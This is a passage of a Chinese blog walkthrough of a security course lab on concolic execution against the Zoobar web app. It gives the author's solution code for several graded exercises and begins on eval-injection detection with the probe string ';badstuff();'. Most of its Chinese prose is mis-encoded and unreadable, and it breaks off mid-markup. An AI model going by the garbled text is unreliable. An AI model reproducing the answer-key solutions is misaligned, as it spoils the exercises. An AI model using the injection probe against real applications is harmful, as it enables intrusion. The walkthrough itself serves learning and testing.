class="hljs-comment">## - Use concolic_find_input() to construct a new input to test,</span><br><span class="hljs-comment">##   based on the above constraint.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Since Z3 might not assign values to every variable</span><br><span class="hljs-comment">##   (such as if that variable turns out to be irrelevant to</span><br><span class="hljs-comment">##   the overall constraint), inherit unassigned values from</span><br><span class="hljs-comment">##   the input that we just tried (i.e., concrete_values).</span><br><span class="hljs-comment">##   You can use the inherit() method in ConcreteValues for this.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Add the input to the queue for processing, along the lines of:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##     inputs.add(new_values, caller)</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##   where caller is the corresponding value from the list of call</span><br><span class="hljs-comment">##   sites returned by concolic_find_input (i.e., branch_callers).</span><br></code></pre></td></tr></table></figure><ul><li>è¿­ä»£ <code>concolic_exec_input()</code> æ‰€è¿”å›çš„åˆ†æ”¯é›†åˆ</li><li>ä½¿ç”¨ <code>concolic_force_branch()</code> æ¥æ„å»ºä¸€ä¸ªåˆ†æ”¯çš„å¦ä¸€è·¯å¾„çº¦æŸ</li><li>è‹¥çº¦æŸå·²ç»åœ¨ <code>check</code> é›†åˆä¸­ï¼Œå°†å…¶è·³è¿‡ï¼Œå¦åˆ™åŠ å…¥é›†åˆä¸­</li><li>ä½¿ç”¨ <code>concolic_find_input()</code> ä»¥æ„å»ºä¸€ä¸ªåŸºäºå¦ä¸€è·¯å¾„çº¦æŸçš„æ–°çš„æµ‹è¯•è¾“å…¥</li><li>Z3 å¯èƒ½ä¸ä¼šä¸ºæ¯ä¸ªå˜é‡åˆ†é…å€¼ï¼ˆä¾‹å¦‚å˜é‡å¯èƒ½ä¸çº¦æŸæ— å…³ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ä»ä¸Šæ¬¡ä½¿ç”¨çš„å­—å…¸ç»§æ‰¿åˆ° <code>concolic_find_input()</code> è¿”å›çš„æ–°å­—å…¸ä¸­ï¼Œå°†æ–°çš„å­—å…¸æ·»åŠ åˆ° <code>input</code> é˜Ÿåˆ—ä¸­</li></ul><p>ä¾ç…§ä»¥ä¸Šæ€è·¯ï¼Œç¬”è€…æœ€ååœ¨å¤§å¾ªç¯æœ«å°¾è¡¥å…¨ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">branch_len = <span class="hljs-built_in">len</span>(branch_conds)<br><span class="hljs-comment"># explore every branch</span><br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(branch_len):<br>  <span class="hljs-comment"># construct new constraint for negative branch</span><br>  cur_constraint = concolic_force_branch(b, branch_conds, branch_callers)<br>  <span class="hljs-comment"># not in `checked` set, solve out the constraint</span><br>  <span class="hljs-keyword">if</span> cur_constraint <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> checked:<br>    checked.add(cur_constraint)<br>    sat, cur_concrete_values = concolic_find_input(cur_constraint, <span class="hljs-literal">None</span>)<br>    <span class="hljs-comment"># satisfiable, add the dict for next round</span><br>    <span class="hljs-keyword">if</span> sat:<br>      cur_concrete_values.inherit(concrete_values)<br>      inputs.add(cur_concrete_values, branch_callers[b])<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 6ï¼š</p><p><img src="https://s2.loli.net/2022/12/19/rSiUjGL92nlzOeb.png" alt="image.png"></p><p>è‡³æ­¤ï¼ŒLab 3 çš„ Part 1 <strong>å…¨éƒ¨å®Œæˆ</strong></p><h2 id="Concolic-execution-for-strings-and-Zoobar"><a href="#Concolic-execution-for-strings-and-Zoobar" class="headerlink" title="Concolic execution for strings and Zoobar"></a>Concolic execution for strings and Zoobar</h2><p>é¦–å…ˆæ˜¯ Exercise 7ï¼Œè¡¥å…¨å¯¹å­—ç¬¦ä¸²ä¸å­—ç¬¦æ•°ç»„çš„ä¸¤ç§è¿ç®—æ”¯æŒï¼šé•¿åº¦ï¼ˆ<code>__len__</code>ï¼‰ä¸åŒ…å«ï¼ˆ<code>__contains__</code>ï¼‰</p><blockquote><p><strong>Exercise 7.</strong> Finish the implementation of concolic execution for strings and byte-arrays in <code>symex/fuzzy.py</code>. We left out support for two operations on <code>concolic_str</code> and <code>concolic_bytes</code> objects. The first is computing the length of a string, and the second is checking whether a particular string <code>a</code> appears in string <code>b</code> (i.e., <code>a</code> is contained in <code>b</code>, the underlying implementation of Pythonâ€™s â€œa in bâ€ construct).</p><p>Look for the comment <code>Exercise 7: your code here</code> to find where you should implement the code for this exercise. We have already implemented the <code>sym_contains</code> and <code>sym_length</code> AST nodes for you, which should come in handy for this exercise.</p><p>Run <strong>.&#x2F;check-concolic-str.py</strong> <em>and</em> <strong>.&#x2F;check-symex-str.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p></blockquote><p>å¯¹äºç¬¦å·å€¼è€Œè¨€è¯¥æ¡†æ¶å·²ç»æä¾›äº†å°è£…å¥½çš„ <code>sym_contains</code> ä¸ <code>sym_length</code> ï¼Œæˆ‘ä»¬åªéœ€è¦å®ç°å¯¹å…·ä½“å€¼çš„åˆ¤æ–­å³å¯ï¼Œè¿™é‡Œåˆ«å¿˜äº†æœ€åçš„è¿”å›å€¼åº”å½“è°ƒç”¨ <code>concolic_bool()</code> ä»¥åœ¨å…¨å±€åˆ—è¡¨ä¸­æ·»åŠ è·¯å¾„çº¦æŸä¸ä¿¡æ¯</p><p>å¾…è¡¥å…¨çš„ä¸¤å¤„çš†ä¸ºä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 7: your code here.</span><br><span class="hljs-comment">## Implement symbolic versions of string length (override __len__)</span><br><span class="hljs-comment">## and contains (override __contains__).</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__len__</span>(<span class="hljs-params">self</span>):<br>  <span class="hljs-keyword">return</span> concolic_int(sym_length(ast(self)), <span class="hljs-built_in">len</span>(self.__v))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__contains__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_str):<br>    res = o.__v <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = o <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">return</span> concolic_bool(sym_contains(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 7ï¼š</p><p><img src="https://s2.loli.net/2022/12/19/CNrSIEkOe54tuoB.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨ Zoobar ä¸­å®Œæˆä¸€ä¸ª <code>concolic HTTP request</code>ï¼Œå› æ­¤å¾…æŸ¥è¯¢çš„ username ä¹Ÿå°†ä¸ºä¸€ä¸ªæ··åˆå€¼ï¼ˆç”± HTTP cookie å¸¦æ¥ï¼‰ï¼Œäºæ˜¯æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨ SQL æŸ¥è¯¢ä¸Šåº”ç”¨æ··åˆæ‰§è¡Œï¼Œä½† SQLite ç”± C è€Œé Python ç¼–å†™ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹å…¶å†…éƒ¨ä»£ç </p><p>äºæ˜¯æ¥ä¸‹æ¥æ¥åˆ° Exercise8ï¼Œå¯¹ SQL çš„ <code>get()</code> åº”ç”¨ä¸€å±‚ wrapper ä»¥å¯¹ SQL è¯­å¥çš„ç»“æœåº”ç”¨æ··åˆæ‰§è¡Œï¼š</p><blockquote><p><strong>Exercise 8.</strong> Figure out how to handle the SQL database so that the concolic engine can create constraints against the data returned by the database. To help you do this, weâ€™ve written an empty wrapper around the sqlalchemy <code>get</code> method, in <code>symex/symsql.py</code>. Implement this wrapper so that concolic execution can try all possible records in a database. Examine <strong>.&#x2F;check-symex-sql.py</strong> to see how we are thinking of performing database lookups on concolic values.</p><p>You will likely need to consult the reference for the <a href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> to understand what the behavior of <code>get</code> should be and what your replacement implementation should be doing.</p><p>Run <strong>.&#x2F;check-symex-sql.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p></blockquote><p>é‚£æˆ‘ä»¬å…ˆçœ‹çœ‹ <code>./check-symex-sql.py</code> é‡Œé¢çš„ä¸»ä½“é€»è¾‘ï¼ˆå…³äº SQLalchemy åº“ç›¸å…³çš„å¯ä»¥å…ˆçœ‹ <a href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> ï¼‰ï¼Œé¦–å…ˆå£°æ˜äº† <code>Test1Base</code> å’Œ <code>Test2Base</code>ï¼Œè¿™ä¸¤ä¸ªç›¸å½“äºä¸¤ç»„ä¸åŒçš„æµ‹è¯•ç”¨ä¾‹ï¼Œæˆ‘ä»¬ä»…åˆ†æå…¶ä¸­ä¸€ç»„å³å¯ï¼Œä¹‹åå®šä¹‰äº†ç±» <code>Test1</code> ç»§æ‰¿è‡ª <code>Test1Base</code>ï¼Œå¹¶ä¸ºè¯¥æ•°æ®åº“è®¾ç½®äº†ä¸¤åˆ—ï¼Œå…¶ä¸­ <code>name</code> ä¸ºä¸»é”®ï¼š</p><blockquote><p>è¿™é‡ŒæŒ‰ç…§ç¬”è€…çš„ç†è§£ï¼Œä¸€ä¸ª <code>Test1</code> å®ä¾‹è¡¨ç¤ºçš„åº”è¯¥æ˜¯åœ¨è¯¥æ•°æ®åº“ä¸­ä¸€è¡Œçš„æ•°æ®</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">Test1Base = declarative_base()<br>Test2Base = declarative_base()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span>(<span class="hljs-title class_ inherited__">Test1Base</span>):<br>    __tablename__ = <span class="hljs-string">&quot;test1&quot;</span><br>    name = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    value = Column(Integer)<br></code></pre></td></tr></table></figure><p>ä¹‹åæ˜¯æ•°æ®åº“åˆå§‹åŒ–å·¥ä½œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbsetup</span>(<span class="hljs-params">name, base</span>):<br>    dbfile = os.path.join(dbdir, <span class="hljs-string">&quot;%s.db&quot;</span> % name)<br>    engine = create_engine(<span class="hljs-string">&#x27;sqlite:///%s&#x27;</span> % dbfile,<br>                           isolation_level=<span class="hljs-string">&#x27;SERIALIZABLE&#x27;</span>)<br>    base.metadata.create_all(engine)<br>    session = sessionmaker(bind=engine)<br>    <span class="hljs-keyword">return</span> session()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test1_setup</span>():<br>    <span class="hljs-keyword">return</span> dbsetup(<span class="hljs-string">&quot;test1&quot;</span>, Test1Base)<br></code></pre></td></tr></table></figure><p>åœ¨ <code>test_f()</code> ä¸­ä¼šè°ƒç”¨ <code>test1_setup()</code> è¿›è¡Œæ•°æ®åº“ <code>&quot;test1&quot;</code> çš„åˆ›å»ºï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæ··åˆå­—ç¬¦ä¸² <code>s</code>ï¼Œå°†å…¶ä½œä¸ºå‚æ•°ç»™åˆ°æ•°æ®åº“çš„ get å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    db = test1_setup()<br>    s = fuzzy.mk_str(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    r = db.query(Test1).get(s)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        v = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">else</span>:<br>        v = r.value<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>query()</code> å±•å¼€æ¥å…¶å®æ˜¯ <code>SELECT test1.nameSELECT test1.name AS test1_name, test1.value AS test1_value FROM test1</code> è¿™æ ·çš„ SQL è¯­å¥ï¼ˆæ¯”è¾ƒç¬¨çš„åŠæ³•å°±æ˜¯å¯ä»¥é€šè¿‡åœ¨ <code>get()</code> ä¸­æ‰“å° <code>query</code> çš„æ–¹å¼æŸ¥çœ‹ï¼‰ï¼Œå…¶ä¸­é€‰æ‹©çš„éƒ½æ˜¯æˆ‘ä»¬ä¸º <code>Test1</code> ç±»æ‰€å®šä¹‰çš„å˜é‡ï¼Œè€Œ <code>get()</code> çš„åŸå§‹ä½œç”¨åˆ™ä¸ºä»æŸ¥è¯¢ç»“æœä¸­é€‰æ‹©ç¬¦åˆæ¡ä»¶çš„ä¸€è¡Œ</p><p>å®Œæˆä¸Šè¿°å®šä¹‰ä¹‹åï¼Œåœ¨æ–‡ä»¶ä¸­é¦–å…ˆè°ƒç”¨ <code>test1_setup()</code> è¿›è¡Œæ•°æ®åº“ <code>&quot;test1&quot;</code> çš„åˆ›å»ºï¼Œå¹¶æ·»åŠ äº†ä¸¤è¡Œæ•°æ®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">t1 = test1_setup()<br>t1a = Test1()<br>t1a.name = <span class="hljs-string">&#x27;foo&#x27;</span><br>t1a.value = <span class="hljs-number">924</span><br>t1.add(t1a)<br>t1b = Test1()<br>t1b.name = <span class="hljs-string">&#x27;barr&#x27;</span><br>t1b.value = <span class="hljs-number">22</span><br>t1.add(t1b)<br>t1.commit()<br></code></pre></td></tr></table></figure><p>æœ€åå¯¹ <code>test_f()</code> åº”ç”¨æ··åˆæ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Testing f..&#x27;</span>)<br>f_results = fuzzy.concolic_execs(test_f, verbose=<span class="hljs-number">10</span>)<br>f_expected = (<span class="hljs-number">924</span>, <span class="hljs-number">22</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(x <span class="hljs-keyword">in</span> f_results <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f_expected):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found all cases for f&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Missing some cases for f:&quot;</span>, <span class="hljs-built_in">set</span>(f_expected) - <span class="hljs-built_in">set</span>(f_results))<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ¥åˆ°æˆ‘ä»¬éœ€è¦è¡¥å…¨ä»£ç çš„ <code>symex/symsql.py</code> å½“ä¸­ï¼Œæ•´ç†é€»è¾‘éå¸¸ç®€å•ï¼Œåªå®šä¹‰äº†ä¸€ä¸ªå¾…æˆ‘ä»¬è¡¥å…¨çš„ <code>newget()</code>ï¼Œå¹¶ç”¨å…¶æ›¿æ¢æ‰äº†åŸæœ‰çš„ <code>get()</code> å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This module wraps SQLalchemy&#x27;s methods to be friendly to</span><br><span class="hljs-comment">## symbolic / concolic execution.</span><br><br><span class="hljs-keyword">import</span> sqlalchemy.orm<br><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> fuzzy<br><br>oldget = sqlalchemy.orm.query.Query.get<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>sqlalchemy.orm.query.Query.get = newget<br></code></pre></td></tr></table></figure><p>å‚æ•° <code>query</code> å…¶å®å°±æ˜¯åé¢åˆ›å»ºçš„ Query å¯¹è±¡ä¸­çš„ <code>self</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹ SQLAlchemy æ–‡æ¡£ä¸­æœ‰æ²¡æœ‰æ¯”è¾ƒæœ‰ç”¨çš„æ–¹æ³•ï¼Œå®é™…ä¸Šåœ¨æ•°æ®åº“çš„ <code>å¢åˆ æ”¹æŸ¥</code> å½“ä¸­ï¼Œå¯¹äºæœ¬é¢˜è€Œè¨€æˆ‘ä»¬åªéœ€è¦å…³æ³¨â€œæŸ¥â€ï¼Œæ³¨æ„åˆ°æœ‰è¿™æ ·ä¸€ä¸ªæ–¹æ³•å¯ä»¥å°†æŸ¥è¯¢ç»“æœä»¥åˆ—è¡¨çš„å½¢å¼è¿”å›ï¼š</p><p><img src="https://s2.loli.net/2022/12/21/CKVXIAh7OWpvobk.png" alt="image.png"></p><p>æ–‡æ¡£é‡Œæ²¡æœ‰ä»”ç»†è¯´æ¸…æ¥šï¼ˆ <del>ä¹Ÿå¯èƒ½æ˜¯ğŸ‘´æ²¡ä»”ç»†çœ‹</del> ï¼‰ï¼Œç¬”è€…å®æµ‹äº†ä¸€ä¸‹ï¼Œè¿”å›çš„åˆ—è¡¨çš„æˆå‘˜çš†ä¸º <code>Test1</code> æˆ– <code>Test2</code> ç±»å‹çš„å¯¹è±¡å®ä¾‹ï¼Œå³ <code>ä¸€è¡Œçš„æ•°æ®</code>ï¼Œè¿™é‡Œæˆ‘ä»¬åŒæ—¶ä¹Ÿå¯ä»¥çœ‹å‡ºåœ¨ <code>test1</code> æ•°æ®åº“ä¸­æœ‰ä¸¤ä¸ª <code>Test1</code>ï¼ˆä¸¤è¡Œï¼‰ï¼Œåˆšå¥½å¯¹åº”ä¸€å¼€å§‹æ·»åŠ è¿›å»çš„ä¸¤è¡Œï¼š</p><p><img src="https://s2.loli.net/2022/12/21/WLK4erN95ngCFil.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å…¶å®å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œ<code>get()</code> çš„ç¬¬äºŒä¸ªå‚æ•°ä¸º <code>primary_key</code>ï¼Œå³æˆ‘ä»¬åªéœ€è¦å¯¹æ¯”æŸ¥è¯¢ç»“æœæ‰¾åˆ°å…¶ä¸­ <code>primary_key</code> çš„å€¼ä¸ä¼ å…¥çš„å‚æ•°å€¼ç›¸åŒçš„é‚£ä¸€è¡Œå¹¶å°†å…¶è¿”å›å³å¯</p><p>åœ¨å¾…æ··åˆæ‰§è¡Œå‡½æ•° <code>test_f()</code> ä¸ <code>test_g()</code> å½“ä¸­ä¼ å…¥çš„ <code>primary_key()</code> çš†ä¸º <code>concolic</code> ç±»å‹å˜é‡ï¼Œè€Œæˆ‘ä»¬å·²ç»å®Œæˆäº† <code>concolic_int</code> ä¸ <code>concolic_str</code> çš„ <code>__cmp__</code> è¿ç®—ç¬¦é‡è½½ï¼Œå› æ­¤åœ¨é‡å†™çš„ get å‡½æ•°ä¸­ç›´æ¥ä½¿ç”¨ <code>==</code> è¿›è¡Œå¯¹æ¯”å³å¯</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶æˆ‘ä»¬çŸ¥é“ <code>Test1</code> çš„ä¸»é”®ä¸º <code>name</code>ï¼Œä½†è¿™é‡Œç›¸æ¯”èµ·ç›´æ¥ä½¿ç”¨ <code>row.name</code>ï¼Œæˆ‘ä»¬éœ€è¦ä¸”åº”å½“å†™ä¸€ä¸ª<strong>æ›´ä¸ºé€šç”¨çš„æ–¹æ³•</strong>ï¼Œåœ¨æ³¨é‡Šä¸­æç¤ºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>r.__table__.primary_key.columns.keys()[0]</code> è·å–ä¸»é”®åçš„å­—ç¬¦ä¸²ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Python çš„å†…ç½®æ–¹æ³• <code>getattr()</code> æ¥è·å–ä¸»é”®çš„å€¼ï¼Œå› æ­¤æœ€åçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  rows = query.<span class="hljs-built_in">all</span>()<br><br>  <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> query.<span class="hljs-built_in">all</span>():<br>    primary_key_in_row = <span class="hljs-built_in">getattr</span>(r, r.__table__.primary_key.columns.keys()[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> primary_key_in_row == primary_key:<br>      <span class="hljs-keyword">return</span> r<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 8ï¼š</p><p><img src="https://s2.loli.net/2022/12/21/wIzaOhY4bJxsNgq.png" alt="image.png"></p><blockquote><p>æ³¨æ„è¿™é‡Œéœ€è¦<strong>é¢å¤–é€šè¿‡ Exercise 9 çš„ç¬¬ä¸€é¡¹æ‰è¡¨ç¤ºåšå¯¹äº†</strong>ï¼Œå› ä¸ºåé¢éœ€è¦å€ŸåŠ©è¿™é‡Œçš„ç¬¦å·æ‰§è¡Œä»£ç æ¼”ç¤ºä¸€äº›ä¸œè¥¿</p></blockquote><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹å¯¹ Zoobar åº”ç”¨æˆ‘ä»¬çš„æ··åˆæ‰§è¡Œæ¡†æ¶äº†ï¼Œæˆ‘ä»¬é¦–å…ˆå°è¯•è¿è¡Œ <code>./check-symex-zoobar.py</code>ï¼Œåœ¨å…¶ä¸­æœ‰ç€å¯¹ Zoobar ä½¿ç”¨ç¬¦å·è¾“å…¥çš„ç›¸å…³é€»è¾‘ï¼Œä¸”ä¸ºäº†è®©æ··åˆæ‰§è¡Œèƒ½å¤Ÿå¿«é€Ÿç»“æŸï¼Œå…¶è¿‡åº¦çº¦æŸäº†ç»™äºˆ Zoobar çš„è¾“å…¥ï¼Œæ­¤å¤–æ‰€æœ‰çš„ HTTP è¯·æ±‚æ–¹æ³•ï¼ˆäº <code>environ[&#39;REQUEST_METHOD&#39;]</code> ä¸­ï¼‰çš†ä¸º <code>GET</code>ï¼Œä¸”è¯·æ±‚çš„æ‰€æœ‰ UQLï¼ˆäº <code>environ[&#39;PATH_INFO&#39;]</code> ä¸­ï¼‰çš†ä»¥ <code>trans</code> èµ·å§‹</p><p>ç›¸è¾ƒäºç›´æ¥è¿è¡Œï¼ŒLab æ›´æ¨èä½¿ç”¨ <code>script</code> æ¥è¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure><p>ä¹‹åå±å¹•ä¸Šä¼šæŒç»­æ‰“å‡ºä¸€å †ä¿¡æ¯ï¼š</p><p><img src="https://s2.loli.net/2022/12/21/D79tqYuBGXFHPjd.png" alt="image.png"></p><p>å¤§æ¦‚åå‡ ç§’åç»“æŸï¼Œè¿­ä»£çš„æ•°é‡è¡¨ç¤ºä¸åŒçš„è·¯å¾„ï¼š</p><p><img src="https://s2.loli.net/2022/12/21/UHD4s6MIq9pRCBc.png" alt="image.png"></p><blockquote><p>å’Œå®éªŒæ‰‹å†Œä¸­ä¸åŒçš„æ˜¯ç¬”è€…è¿™é‡Œæœ‰ <code>142 iterations</code>ï¼Œä½†åœ¨å®éªŒæ‰‹å†Œé‡Œæ˜¯ <code>139</code>ï¼Œè¿™é‡Œæš‚ä¸”å…ˆä¸ç®¡ï¼ˆ</p></blockquote><p>ç”±äº Zoobar ç”± Python ç¼–å†™ï¼Œæ•…ä¸ä¼šæœ‰å†…å­˜æŸåè¿™ä¸€ç±»çš„æ¼æ´ï¼ˆè¿™å¥è¯æ˜¯å®éªŒæ‰‹å†Œè¯´çš„ï¼Œä½†æ˜¯<a href="https://www.cvedetails.com/cve/CVE-2021-3177/"> CVE-2021-3177</a>å’Œä¸€ä¼—å…¶ä»– CVE è¡¨ç¤ºï¼šæ€ä¹ˆä¼šæ˜¯å‘¢ï¼Ÿï¼‰ï¼Œå› æ­¤æˆ‘ä»¬æ²¡æ³•ç«‹åˆ»è¾¨æ˜åœ¨è¿™ä¸€ç™¾å¤šè·¯å¾„ä¸­æ˜¯å¦å­˜åœ¨é—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å€ŸåŠ©ä¸€äº›æ˜¾å¼çš„ä¸å˜é‡ï¼ˆinvariantï¼‰æ¥æ•æ‰è¡¨ç¤ºå®‰å…¨é—®é¢˜çš„æƒ…å†µ</p><p>Lab å·²ç»å®ç°äº†çš„ä¸€ä¸ªä¸å˜é‡ä¾¿æ˜¯ eval injectionâ€”â€”å³å¯¹ <code>eval()</code> çš„å‚æ•°è¿›è¡Œæ³¨å…¥ï¼Œåœ¨ <code>symex/symeval.py</code> ä¸­ Lab ç»™å‡ºäº†å¯¹è¿™ç§æƒ…å†µçš„æ£€æŸ¥æ€è·¯ï¼šè‹¥ä¼ ç»™ <code>eval()</code> çš„å­—ç¬¦ä¸²å¯ä»¥åŒ…å«  <code>;badstuff();</code> ï¼Œè¯´æ˜æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª eval injection æ¼æ´â€”â€”ç”±æ­¤æˆ‘ä»¬å¯ä»¥è®©æ··åˆæ‰§è¡Œç³»ç»Ÿå»å°è¯•æ„å»ºèƒ½åŒ…å«è¯¥å­ä¸²çš„å­—ç¬¦ä¸²</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ Zoobar ä¸­æ˜¯å¦å­˜åœ¨ eval injection æ¼æ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 